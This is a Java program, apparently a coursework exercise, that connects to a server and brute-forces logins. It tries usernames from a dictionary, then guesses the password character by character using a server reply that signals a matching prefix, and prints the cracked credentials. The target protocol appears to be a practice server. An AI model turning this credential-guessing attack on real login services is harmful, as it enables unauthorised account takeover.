package hacker;

import com.google.gson.Gson;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Iterator;
import java.util.List;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;


//gson messages
// built from login
//password
//find login
//find first ch of password
//find password from there


@SuppressWarnings("RedundantLabeledSwitchRuleCodeBlock")
public class Main {
    static final File DATA_FOLDER = new File("data");
    static final File LOGS_FOLDER = new File("logs");

    static File passwordDictionary;
    static File usernameDictionary;
    static List<String> passwordList;
    static List<String> loginList;

    static Logger parentLogger = Logger.getLogger(Main.class.getPackageName());
    static Logger logger = Logger.getLogger(Main.class.getCanonicalName());

//  logger setup

    static {
        //noinspection ResultOfMethodCallIgnored
        DATA_FOLDER.mkdirs();
        //noinspection ResultOfMethodCallIgnored
        LOGS_FOLDER.mkdirs();

        try {
            parentLogger.setLevel(Level.INFO);
            FileHandler fh = new FileHandler(LOGS_FOLDER.getPath() + "/hacker.log");
            fh.setFormatter(new SimpleFormatter());
            parentLogger.addHandler(fh);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not create dictionary", e);
        }
    }

//  dictionaries setup
//  todo dynamically/user set dictionaries

    static {
        passwordDictionary = new File(DATA_FOLDER, "passwords.txt");
        usernameDictionary = new File(DATA_FOLDER, "logins.txt");

        logger.info("attempting password dictionary read");
        try (BufferedReader br = new BufferedReader(new FileReader(passwordDictionary))) {
            passwordList = br.lines().toList();
        } catch (FileNotFoundException e) {
            logger.log(Level.SEVERE, "Could not read password dictionary, file not found", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not read password dictionary", e);
        }

        logger.info("attempting login dictionary read");
        try (BufferedReader br = new BufferedReader(new FileReader(usernameDictionary))) {
            loginList = br.lines().toList();
        } catch (FileNotFoundException e) {
            logger.log(Level.SEVERE, "Could not read username dictionary, file not found", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not read username dictionary", e);
        }
    }

    static NetClient client;

    private static String pw;
    private static String login;
    private static String prefix = "";

    public static void main(String[] args) {
        if (args.length != 2) {
            System.out.println("Invalid number of arguments!");
            System.exit(1);
        }
        String address = args[0];
        int port = Integer.parseInt(args[1]);

        logger.info("Connecting to " + address + ":" + port);
        try (Socket socket = new Socket(address, port)) {
            client = new NetClient(socket);
            Request request;

            ResponseType responseType = ResponseType.BAD_LOGIN;
            //finite state machine?
            //dynamically take appropriate action based on response?

            Iterator<String> loginGen = loginList.iterator();
            Iterator<String> chGen = new BruteForceGenerator(1);

            do {
                switch (responseType) {
                    case BAD_LOGIN -> {
                        //gen logins
                        if (loginGen.hasNext()) {
                            login = loginGen.next();
                            pw = "A";
                        } else {
                            throw new RuntimeException("Ran out of logins");
                        }
                    }
                    case BAD_PASSWORD -> {

                        if (chGen.hasNext()) {
                            pw = prefix + chGen.next();
                        } else {
                            throw new RuntimeException("Ran out of first characters");
                        }

                    }
                    case BAD_REQUEST -> {
                        throw new IllegalStateException("Invalid format or missing fields");
                    }
                    case PREFIX_MATCH -> {
                        prefix = pw;
                        chGen = new BruteForceGenerator(1);
                        pw = prefix + chGen.next();
                    }
                    case EXCEPTION -> {
                        throw new IllegalStateException("Ayo wtf");
                    }
                    default -> throw new IllegalStateException("Ayo wtf");
                }
                request = new Request(login, pw);
                Response response = client.sendAndReceive(request);
                responseType = ResponseType.getByResponse(response);
            } while (responseType != ResponseType.SUCCESS);


            client.close();
            client = null;


            System.out.println(new Gson().toJson(request));


        } catch (UnknownHostException e) {
            logger.log(Level.SEVERE, "Unknown host", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "I/O exception", e);
        }
    }
}
